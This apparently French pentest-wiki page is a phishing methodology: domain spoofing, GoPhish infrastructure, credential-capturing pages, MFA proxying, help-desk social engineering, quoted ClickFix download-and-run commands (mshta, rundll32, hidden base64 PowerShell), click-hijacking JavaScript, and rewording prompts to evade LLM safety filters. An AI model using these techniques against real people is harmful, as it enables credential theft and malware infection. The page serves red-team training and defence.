# Méthodologie de phishing

{{#include ../../banners/hacktricks-training.md}}

## Méthodologie

1. Effectuer la reconnaissance de la victime
1. Sélectionner le **domaine de la victime**.
2. Effectuer une énumération web basique **à la recherche de portails de connexion** utilisés par la victime et **décider** lequel vous allez **usurper**.
3. Utiliser l’**OSINT** pour **trouver des adresses e-mail**.
2. Préparer l’environnement
1. **Acheter le domaine** que vous allez utiliser pour l’évaluation de phishing
2. **Configurer les enregistrements** associés au service e-mail (SPF, DMARC, DKIM, rDNS)
3. Configurer le VPS avec **gophish**
3. Préparer la campagne
1. Préparer le **modèle d’e-mail**
2. Préparer la **page web** destinée à voler les identifiants
4. Lancer la campagne !

## Générer des noms de domaine similaires ou acheter un domaine de confiance

### Techniques de variation des noms de domaine

- **Mot-clé** : Le nom de domaine **contient un **mot-clé** important** du domaine d’origine (par ex. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Sous-domaine avec trait d’union** : Remplacer le **point par un trait d’union** dans un sous-domaine (par ex. www-zelster.com).
- **Nouveau TLD** : Même domaine utilisant un **nouveau TLD** (par ex. zelster.org)
- **Homoglyph** : Il **remplace** une lettre du nom de domaine par des **lettres qui lui ressemblent** (par ex. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition :** Il **intervertit deux lettres** du nom de domaine (par ex. zelsetr.com).
- **Singularisation/Pluralisation** : Ajoute ou supprime le « s » à la fin du nom de domaine (par ex. zeltsers.com).
- **Omission** : Il **supprime l’une** des lettres du nom de domaine (par ex. zelser.com).
- **Répétition :** Il **répète l’une** des lettres du nom de domaine (par ex. zeltsser.com).
- **Remplacement** : Similaire à Homoglyph, mais moins furtif. Il remplace l’une des lettres du nom de domaine, éventuellement par une lettre proche de la lettre d’origine sur le clavier (par ex. zektser.com).
- **Ajout d’un sous-domaine** : Introduire un **point** à l’intérieur du nom de domaine (par ex. ze.lster.com).
- **Insertion** : Il **insère une lettre** dans le nom de domaine (par ex. zerltser.com).
- **Point manquant** : Ajouter le TLD au nom de domaine (par ex. zelstercom.com)

**Outils automatiques**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Sites web**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Il est **possible que certains bits stockés ou en cours de communication soient automatiquement inversés** en raison de divers facteurs comme les éruptions solaires, les rayons cosmiques ou des erreurs matérielles.

Lorsque ce concept est **appliqué aux requêtes DNS**, il est possible que le **domaine reçu par le serveur DNS** ne soit pas le même que celui demandé initialement.

Par exemple, la modification d’un seul bit dans le domaine « windows.com » peut le transformer en « windnws.com ».

Les attaquants peuvent **tirer parti de ce phénomène en enregistrant plusieurs domaines de bit-flipping** similaires au domaine de la victime. Leur objectif est de rediriger les utilisateurs légitimes vers leur propre infrastructure.

Pour plus d’informations, consultez [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Acheter un domaine de confiance

Vous pouvez rechercher sur [https://www.expireddomains.net/](https://www.expireddomains.net) un domaine expiré que vous pourriez utiliser.\
Pour vous assurer que le domaine expiré que vous allez acheter **bénéficie déjà d’un bon référencement SEO**, vous pouvez vérifier comment il est catégorisé sur :

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Découvrir des adresses e-mail

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100 % gratuit)
- [https://phonebook.cz/](https://phonebook.cz) (100 % gratuit)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Afin de **découvrir davantage** d’adresses e-mail valides ou de **vérifier celles que** vous avez déjà découvertes, vous pouvez vérifier s’il est possible de les tester par brute force sur les serveurs SMTP de la victime. [Apprenez ici comment vérifier/découvrir une adresse e-mail](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
De plus, n’oubliez pas que si les utilisateurs utilisent **un portail web pour accéder à leurs e-mails**, vous pouvez vérifier s’il est vulnérable au **brute force de noms d’utilisateur** et exploiter la vulnérabilité si possible.

## Configurer GoPhish

### Installation

Vous pouvez le télécharger depuis [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Téléchargez-le et décompressez-le dans `/opt/gophish`, puis exécutez `/opt/gophish/gophish`\
Un mot de passe pour l’utilisateur admin sur le port 3333 vous sera fourni dans la sortie. Accédez donc à ce port et utilisez ces identifiants pour modifier le mot de passe admin. Vous devrez peut-être tunneler ce port vers votre machine locale :
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**Configuration du certificat TLS**

Avant cette étape, vous devez avoir **déjà acheté le domaine** que vous allez utiliser, et celui-ci doit **pointer** vers l’**IP du VPS** sur lequel vous configurez **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configuration de la messagerie**

Commencez l’installation : `apt-get install postfix`

Ajoutez ensuite le domaine aux fichiers suivants :

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Modifiez également les valeurs des variables suivantes dans /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Enfin, modifiez les fichiers **`/etc/hostname`** et **`/etc/mailname`** avec le nom de votre domaine, puis **redémarrez votre VPS.**

Créez maintenant un **enregistrement DNS A** pour `mail.<domain>` pointant vers l’**adresse IP** du VPS, ainsi qu’un **enregistrement DNS MX** pointant vers `mail.<domain>`.

Testons maintenant l’envoi d’un e-mail :
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configuration de Gophish**

Arrêtez l’exécution de gophish et configurons-le.\
Modifiez `/opt/gophish/config.json` comme suit (notez l’utilisation de https) :
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configurer le service gophish**

Pour créer le service gophish afin qu’il puisse être démarré automatiquement et géré comme un service, vous pouvez créer le fichier `/etc/init.d/gophish` avec le contenu suivant :
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Terminez la configuration du service et vérifiez-le en procédant comme suit :
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configuration du serveur de messagerie et du domaine

### Attendre et être légitime

Plus un domaine est ancien, moins il est probable qu'il soit détecté comme spam. Vous devez donc attendre aussi longtemps que possible (au moins 1 semaine) avant l'évaluation de phishing. De plus, si vous créez une page concernant un secteur réputé, la réputation obtenue sera meilleure.

Notez que même si vous devez attendre une semaine, vous pouvez terminer toute la configuration dès maintenant.

### Configurer l'enregistrement Reverse DNS (rDNS)

Définissez un enregistrement rDNS (PTR) qui résout l'adresse IP du VPS vers le nom de domaine.

### Enregistrement Sender Policy Framework (SPF)

Vous devez **configurer un enregistrement SPF pour le nouveau domaine**. Si vous ne savez pas ce qu'est un enregistrement SPF, [**consultez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Vous pouvez utiliser [https://www.spfwizard.net/](https://www.spfwizard.net) pour générer votre policy SPF (utilisez l'adresse IP de la machine VPS).

![Formulaire SPF Wizard pour générer un enregistrement SPF pour un domaine de phishing](<../../images/image (1037).png>)

Voici le contenu qui doit être défini dans un enregistrement TXT du domaine :
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Enregistrement Domain-based Message Authentication, Reporting & Conformance (DMARC)

Vous devez **configurer un enregistrement DMARC pour le nouveau domaine**. Si vous ne savez pas ce qu’est un enregistrement DMARC, [**consultez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Vous devez créer un nouvel enregistrement DNS TXT pointant vers le hostname `_dmarc.<domain>` avec le contenu suivant :
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Vous devez **configurer un DKIM pour le nouveau domaine**. Si vous ne savez pas ce qu'est un enregistrement DKIM [**lisez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ce tutoriel est basé sur : [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Vous devez concaténer les deux valeurs B64 générées par la clé DKIM :
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testez le score de votre configuration email

Vous pouvez le faire en utilisant [https://www.mail-tester.com/](https://www.mail-tester.com)\
Accédez simplement à la page et envoyez un email à l'adresse qui vous est fournie :
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Vous pouvez également **vérifier la configuration de votre messagerie** en envoyant un e-mail à `check-auth@verifier.port25.com` et en **lisant la réponse** (pour cela, vous devrez **ouvrir** le port **25** et consulter la réponse dans le fichier _/var/mail/root_ si vous envoyez l’e-mail en tant que root).\
Vérifiez que vous réussissez tous les tests :
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Vous pouvez également envoyer un **message à une adresse Gmail sous votre contrôle**, puis vérifier les **en-têtes de l’e-mail** dans votre boîte de réception Gmail ; `dkim=pass` doit être présent dans le champ d’en-tête `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Suppression de la blacklist Spamhaus

La page [www.mail-tester.com](https://www.mail-tester.com) peut vous indiquer si votre domaine est bloqué par Spamhaus. Vous pouvez demander la suppression de votre domaine/IP à l'adresse suivante : ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Suppression de la blacklist Microsoft

​​Vous pouvez demander la suppression de votre domaine/IP à l'adresse [https://sender.office.com/](https://sender.office.com).

## Créer et lancer une campagne GoPhish

### Sending Profile

- Définissez un **nom pour identifier** le profil d'expédition
- Décidez depuis quel compte vous allez envoyer les e-mails de phishing. Suggestions : _noreply, support, servicedesk, salesforce..._
- Vous pouvez laisser le nom d'utilisateur et le mot de passe vides, mais assurez-vous de cocher Ignore Certificate Errors

![Créer et lancer une campagne GoPhish - Sending Profile : Vous pouvez laisser le nom d'utilisateur et le mot de passe vides, mais assurez-vous de cocher Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Il est recommandé d'utiliser la fonctionnalité "**Send Test Email**" afin de vérifier que tout fonctionne.\
> Je vous recommande **d'envoyer les e-mails de test à des adresses e-mail 10min** afin d'éviter d'être blacklisté pendant les tests.

### Modèle d'e-mail

- Définissez un **nom pour identifier** le modèle
- Rédigez ensuite un **sujet** (rien d'étrange, simplement quelque chose que vous vous attendriez à lire dans un e-mail classique)
- Assurez-vous d'avoir coché "**Add Tracking Image**"
- Rédigez le **modèle d'e-mail** (vous pouvez utiliser des variables comme dans l'exemple suivant) :
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Notez que **pour accroître la crédibilité de l’e-mail**, il est recommandé d’utiliser une signature provenant d’un e-mail du client. Suggestions :

- Envoyez un e-mail à une **adresse inexistante** et vérifiez si la réponse contient une signature.
- Recherchez des **e-mails publics** comme info@ex.com, press@ex.com ou public@ex.com, envoyez-leur un e-mail et attendez la réponse.
- Essayez de contacter un e-mail **valide découvert** et attendez la réponse.

![Sending Profile - Email Template: Essayez de contacter un e-mail valide découvert et attendez la réponse](<../../images/image (80).png>)

> [!TIP]
> L’Email Template permet également d’**attacher des fichiers à envoyer**. Si vous souhaitez aussi voler des challenges NTLM à l’aide de fichiers/documents spécialement conçus [consultez cette page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Définissez un **nom**
- **Écrivez le code HTML** de la page web. Notez que vous pouvez **importer** des pages web.
- Cochez **Capture Submitted Data** et **Capture Passwords**
- Définissez une **redirection**

![Email Template - Landing Page: Cochez Capture Submitted Data et Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> En général, vous devrez modifier le code HTML de la page et effectuer des tests en local (peut-être à l’aide d’un serveur Apache) **jusqu’à obtenir le résultat souhaité.** Écrivez ensuite ce code HTML dans la zone prévue à cet effet.\
> Notez que si vous devez **utiliser des ressources statiques** pour le HTML (par exemple des pages CSS et JS), vous pouvez les enregistrer dans _**/opt/gophish/static/endpoint**_, puis y accéder depuis _**/static/\<filename>**_

> [!TIP]
> Pour la redirection, vous pouvez **rediriger les utilisateurs vers la page web principale légitime** de la victime, ou les rediriger par exemple vers _/static/migration.html_, afficher une **roue de chargement (**[**https://loading.io/**](https://loading.io)**) pendant 5 secondes, puis indiquer que le processus a réussi**.

### Users & Groups

- Définissez un nom
- **Importez les données** (notez que pour utiliser le template de l’exemple, vous devez disposer du prénom, du nom et de l’adresse e-mail de chaque utilisateur)

![Landing Page - Users & Groups: Importez les données (notez que pour utiliser le template de l’exemple, vous devez disposer du prénom, du nom et de l’adresse e-mail de chaque utilisateur)](<../../images/image (163).png>)

### Campaign

Enfin, créez une campagne en sélectionnant un nom, l’email template, la landing page, l’URL, le sending profile et le groupe. Notez que l’URL sera le lien envoyé aux victimes.

Notez que le **Sending Profile permet d’envoyer un e-mail de test pour voir à quoi ressemblera l’e-mail de phishing final** :

![Users & Groups - Campaign: Notez que le Sending Profile permet d’envoyer un e-mail de test pour voir à quoi ressemblera l’e-mail de phishing final](<../../images/image (192).png>)

Une fois que tout est prêt, lancez simplement la campagne !

## Website Cloning

Si, pour une raison quelconque, vous souhaitez cloner le site web, consultez la page suivante :


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Dans certaines évaluations de phishing (principalement pour les Red Teams), vous voudrez également **envoyer des fichiers contenant une sorte de backdoor** (peut-être un C2 ou simplement quelque chose qui déclenchera une authentification).\
Consultez la page suivante pour obtenir quelques exemples :


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

L’attaque précédente est assez ingénieuse, car vous imitez un véritable site web et récupérez les informations saisies par l’utilisateur. Malheureusement, si l’utilisateur n’a pas saisi le bon mot de passe ou si l’application imitée est configurée avec la 2FA, **ces informations ne vous permettront pas d’usurper l’identité de l’utilisateur piégé**.

C’est là que des outils comme [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) et [**muraena**](https://github.com/muraenateam/muraena) sont utiles. Cet outil vous permettra de générer une attaque de type MitM. En résumé, l’attaque fonctionne de la manière suivante :

1. Vous **imitez le formulaire de connexion** de la véritable page web.
2. L’utilisateur **envoie** ses **identifiants** à votre fausse page, et l’outil les envoie à la véritable page web, **en vérifiant si les identifiants fonctionnent**.
3. Si le compte est configuré avec la **2FA**, la page MitM la demandera et, une fois que **l’utilisateur l’aura saisie**, l’outil l’enverra à la véritable page web.
4. Une fois l’utilisateur authentifié, vous (en tant qu’attaquant) aurez **récupéré les identifiants, la 2FA, le cookie et toutes les informations** de chacune de vos interactions pendant que l’outil effectue une attaque MitM.

### Via VNC

Et si, au lieu **d’envoyer la victime vers une page malveillante** ayant la même apparence que l’originale, vous l’envoyiez vers **une session VNC avec un navigateur connecté à la véritable page web** ? Vous pourrez voir ce qu’elle fait, voler le mot de passe, la MFA utilisée, les cookies...\
Vous pouvez faire cela avec [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Évidemment, l’une des meilleures façons de savoir si vous avez été démasqué est de **rechercher votre domaine dans les blocklists**. S’il apparaît dans une liste, cela signifie d’une manière ou d’une autre que votre domaine a été détecté comme suspect.\
Une façon simple de vérifier si votre domaine apparaît dans une blocklist consiste à utiliser [https://malwareworld.com/](https://malwareworld.com)

Cependant, il existe d’autres moyens de savoir si la victime **recherche activement des activités de phishing suspectes sur Internet**, comme expliqué dans :


{{#ref}}
detecting-phising.md
{{#endref}}

Vous pouvez **acheter un domaine dont le nom est très similaire à celui du domaine de la victime** et/ou générer un certificat pour un **sous-domaine** d’un domaine que vous contrôlez, **contenant** le **mot-clé** du domaine de la victime. Si la **victime** effectue une quelconque **interaction DNS ou HTTP** avec ceux-ci, vous saurez qu’**elle recherche activement** des domaines suspects et vous devrez être très furtif.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Utilisez [**Phishious** ](https://github.com/Rices/Phishious)pour évaluer si votre e-mail va finir dans le dossier spam, être bloqué ou être distribué avec succès.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Les groupes d’intrusion modernes contournent de plus en plus les leurres par e-mail et **ciblent directement le workflow du service desk / de la récupération d’identité** pour contourner la MFA. L’attaque repose entièrement sur le principe du "living-off-the-land" : une fois que l’opérateur possède des identifiants valides, il se déplace latéralement à l’aide des outils d’administration intégrés : aucun malware n’est nécessaire.<sup>[[6]](#references)</sup>

### Attack flow
1. Effectuez la reconnaissance de la victime
* Collectez des informations personnelles et professionnelles depuis LinkedIn, des data breaches, GitHub public, etc.
* Identifiez les identités à forte valeur (cadres dirigeants, IT, finance) et recensez le **processus exact du help-desk** pour la réinitialisation du mot de passe / de la MFA.
2. Ingénierie sociale en temps réel
* Appelez, contactez via Teams ou utilisez le chat du help-desk en usurpant l’identité de la cible (souvent avec un **caller-ID usurpé** ou une **voix clonée**).
* Fournissez les PII précédemment collectées pour passer la vérification fondée sur les connaissances.
* Convainquez l’agent de **réinitialiser le secret MFA** ou d’effectuer un **SIM-swap** sur un numéro de mobile enregistré.
3. Actions immédiates post-accès (≤60 min dans les cas réels)
* Établissez un foothold via n’importe quel portail web SSO.
* Recensez AD / AzureAD avec les outils intégrés (aucun binaire déposé) :
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Effectuez des mouvements latéraux avec **WMI**, **PsExec** ou des agents **RMM** légitimes déjà autorisés dans l’environnement.

### Detection & Mitigation
* Traitez la récupération d’identité par le help-desk comme une **opération privilégiée** : exigez une authentification renforcée et l’approbation d’un responsable.
* Déployez des règles **Identity Threat Detection & Response (ITDR)** / **UEBA** qui génèrent une alerte en cas de :
* Modification de la méthode MFA + authentification depuis un nouvel appareil / une nouvelle zone géographique.
* Élévation immédiate du même principal (user-→-admin).
* Enregistrez les appels au help-desk et imposez un **rappel vers un numéro déjà enregistré** avant toute réinitialisation.
* Mettez en œuvre le **Just-In-Time (JIT) / Privileged Access** afin que les comptes nouvellement réinitialisés n’héritent **pas automatiquement de tokens hautement privilégiés**.

---

## Deception à grande échelle – SEO Poisoning & campagnes “ClickFix”
Les groupes généralistes compensent le coût des opérations ciblées par des attaques massives qui transforment les **moteurs de recherche et les réseaux publicitaires en canaux de diffusion**.<sup>[[6]](#references)</sup>

1. Le **SEO poisoning / malvertising** place un faux résultat tel que `chromium-update[.]site` en tête des annonces de recherche.
2. La victime télécharge un petit **first-stage loader** (souvent JS/HTA/ISO). Exemples observés par Unit 42 :
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Le loader exfiltre les cookies du navigateur et les bases de données d’identifiants, puis récupère un **silent loader** qui décide, *en temps réel*, de déployer :
* un RAT (par exemple AsyncRAT, RustDesk)
* un ransomware / wiper
* un composant de persistance (clé Run du registre + tâche planifiée)

### Conseils de hardening
* Bloquez les domaines récemment enregistrés et appliquez l’**Advanced DNS / URL Filtering** aux *search-ads* ainsi qu’aux e-mails.
* Limitez l’installation de logiciels aux packages MSI / Store signés et interdisez l’exécution de `HTA`, `ISO` et `VBS` par policy.
* Surveillez les processus enfants des navigateurs qui ouvrent des installateurs :
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Recherchez les LOLBins fréquemment utilisés abusivement par les first-stage loaders (par exemple `regsvr32`, `curl`, `mshta`).

### Détournement du clic sur le bouton de téléchargement avec transfert vers un TDS
Certains faux portails de logiciels conservent le `href` de téléchargement visible pointant vers la véritable URL GitHub/release, mais détournent la **première** interaction de l’utilisateur en JavaScript et l’envoient plutôt vers une chaîne de **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Caractéristiques clés :
- Le hook s’exécute généralement pendant la **capture phase** (`true`) sur `document`, avant les handlers du site.
- Chrome utilise souvent `mousedown` plutôt que `click` afin de maintenir la redirection liée à un **user gesture** valide et d’améliorer le contournement des bloqueurs de pop-up.
- Certaines variantes ouvrent au préalable `about:blank` ou simulent des clics sur des éléments `<a target="_blank">`, puis n’assignent l’URL du TDS que plus tard.
- Les limites côté navigateur sont souvent stockées dans `localStorage` ; le **premier clic** peut donc rediriger vers le malware, tandis que les actualisations/nouvelles tentatives reviennent au lien visible d’apparence légitime.
- Le TDS peut filtrer selon le referrer, le domaine d’entrée, la GEO, le fingerprint du navigateur/appareil, les contrôles VPN/datacenter, le contexte du clic et des compteurs par session, ce qui rend les replays des analystes non déterministes.

Idées pour les defenders :
- Comparer le `href` **affiché** avec la cible de navigation **réelle** générée au moment du clic.
- Rechercher les handlers `document.addEventListener(..., true)` qui appellent à la fois `preventDefault()` et `stopImmediatePropagation()` autour de `window.open`, `about:blank` ou de clics synthétiques sur des ancres.
- Considérer les ensembles de domaines de téléchargement de logiciels nouvellement enregistrés qui chargent tous le même stage CloudFront/JS comme un pattern SEO-poisoning/TDS à fort signal.

### ClickFix depuis de fausses pages de vérification + fetchs LOLBAS à l’apparence d’archives
Certaines branches du TDS aboutissent à une fausse page de vérification (de style Cloudflare/IUAM) qui demande à la victime d’exécuter un binaire Windows de confiance tel que :<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notes :
- `mshta.exe` exécute le **HTA/VBScript au début de la réponse**, même si l’URL prétend pointer vers une archive `.7z` ; les données d’archive ajoutées peuvent être un simple leurre.
- Les étapes suivantes continuent souvent à mentir sur le type de fichier (`.rtf` pour PowerShell, `.asar` pour Python, ZIP contenant des binaires remplis de données), puis passent au **mappage manuel de PE / à l’exécution en mémoire**.
- Si vous répondez à l’une de ces chaînes, préservez le **réseau + la mémoire dès la première exécution réussie** : les rejoués ultérieurs peuvent uniquement afficher un chemin d’installation/SFX inoffensif ou échouer, car la libération du payload/de la clé était liée à la session TDS d’origine.

### Tradecraft de livraison de DLL ClickFix (fausse mise à jour CERT)
* Leurre : avis CERT national cloné avec un bouton **Update** qui affiche des instructions de « correction » étape par étape. Les victimes doivent exécuter un batch qui télécharge une DLL et l’exécute via `rundll32`.<sup>[[12]](#references)</sup>
* Chaîne batch typique observée :
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` dépose le payload dans `%TEMP%`, une courte pause masque la latence réseau, puis `rundll32` appelle le point d’entrée exporté (`notepad`).
* La DLL envoie l’identité de l’hôte et interroge le C2 toutes les quelques minutes. Les tâches distantes arrivent sous forme de **PowerShell encodé en base64**, exécuté en mode masqué et avec un contournement de la stratégie :
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Cela conserve la flexibilité du C2 (le serveur peut remplacer les tâches sans mettre à jour la DLL) et masque les fenêtres de console. Recherchez les processus PowerShell enfants de `rundll32.exe` utilisant ensemble `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Les défenseurs peuvent rechercher des callbacks HTTP(S) de la forme `...page.php?tynor=<COMPUTER>sss<USER>` et des intervalles d’interrogation de 5 minutes après le chargement de la DLL.

---

## Opérations de phishing améliorées par l’IA
Les attaquants enchaînent désormais les **API de LLM et de clonage vocal** pour créer des leurres entièrement personnalisés et interagir en temps réel.

| Couche | Exemple d’utilisation par l’acteur de la menace |
|-------|-------------|
|Automatisation|Générer et envoyer plus de 100 k e-mails / SMS avec des formulations et des liens de suivi aléatoires.|
|IA générative|Produire des e-mails *uniques* faisant référence à des opérations publiques de M&A et à des blagues internes provenant des réseaux sociaux ; utiliser une voix deepfake de PDG dans une escroquerie par rappel.|
|IA agentique|Enregistrer automatiquement des domaines, extraire des renseignements open source et rédiger les e-mails de l’étape suivante lorsqu’une victime clique sans envoyer ses identifiants.|

**Défense :**
• Ajouter des **bannières dynamiques** signalant les messages envoyés par une automatisation non fiable (via des anomalies ARC/DKIM).
• Déployer des **phrases de défi biométriques vocales** pour les demandes téléphoniques à haut risque.
• Simuler continuellement des leurres générés par IA dans les programmes de sensibilisation – les modèles statiques sont obsolètes.

Voir aussi – abus de la navigation agentique pour le phishing d’identifiants :

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Voir aussi – abus par les agents IA des outils CLI locaux et de MCP (pour l’inventaire et la détection des secrets) :

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Assemblage à l’exécution de JavaScript de phishing assisté par un LLM (génération de code dans le navigateur)

Les attaquants peuvent diffuser du HTML d’apparence inoffensive et **générer le stealer à l’exécution** en demandant du JavaScript à une **API de LLM fiable**, puis en l’exécutant dans le navigateur (par exemple avec `eval` ou un `<script>` dynamique).<sup>[[8]](#references)</sup>

1. **Obfuscation par le prompt :** encoder les URL d’exfiltration/chaînes Base64 dans le prompt ; modifier progressivement la formulation pour contourner les filtres de sécurité et réduire les hallucinations.
